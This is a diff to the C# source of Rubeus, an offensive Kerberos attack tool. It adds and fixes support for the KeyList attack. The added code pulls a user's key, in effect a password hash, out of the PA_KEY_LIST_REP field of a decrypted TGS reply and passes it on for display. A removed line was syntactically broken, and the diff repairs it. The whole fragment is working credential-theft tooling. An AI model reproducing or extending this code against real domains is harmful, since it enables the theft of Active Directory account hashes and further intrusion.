@@ -358,12 +358,12 @@ namespace Rubeus {
                     Console.WriteLine("[*] Requesting '{0}' etype for the service ticket", requestEType);
                 }
 
-                if (!String.IsNullOrEmpty(service))
+                if (keyList)
+                    Console.WriteLine("[*] Building KeyList TGS-REQ request for: '{0}'", userName);
+                else if (!String.IsNullOrEmpty(service))
                     Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
                 else if (u2u)
                     Console.WriteLine("[*] Building User-to-User TGS-REQ request for: '{0}'", userName);
-                else if (keyList)
-                    Console.WriteLine("[*] Building KeyList TGS-REQ request for: '{0}'", userName);
                 else
                     Console.WriteLine("[*] Building TGS-REQ request");
 
@@ -418,6 +418,14 @@ namespace Rubeus {
                 byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
+
+                // extract hash for keylist - Need null for display options
+                string keyListHash = null;
+                if (keyList)
+                {
+                    keyListHash = Helpers.ByteArrayToString(encRepPart.encryptedPaData.PA_KEY_LIST_REP.encryptionKey.keyvalue);
+                }
+                
 
                 // if using /opsec and the ticket is for a server configuration for unconstrained delegation, request a forwardable TGT
                 if (opsec && (!roast) && ((encRepPart.flags & Interop.TicketFlags.ok_as_delegate) != 0))
@@ -516,7 +524,7 @@ namespace Rubeus {
 
                     LSA.DisplayTicket(kirbi, 2, false, false, false, false, 
                         string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey),
-                        ,,,string.IsNullOrEmpty(Helpers.ByteArrayToString(encRepPart.encryptedPaData.PA_KEY_LIST_REP.encryptionKey.keyvalue)) ? null : encRepPart.encryptedPaData.PA_KEY_LIST_REP.encryptionKey.keyvalue;
+                        null,null,null,string.IsNullOrEmpty(keyListHash) ? null : Helpers.StringToByteArray(keyListHash));
                 }
 
                 if (!String.IsNullOrEmpty(outfile))
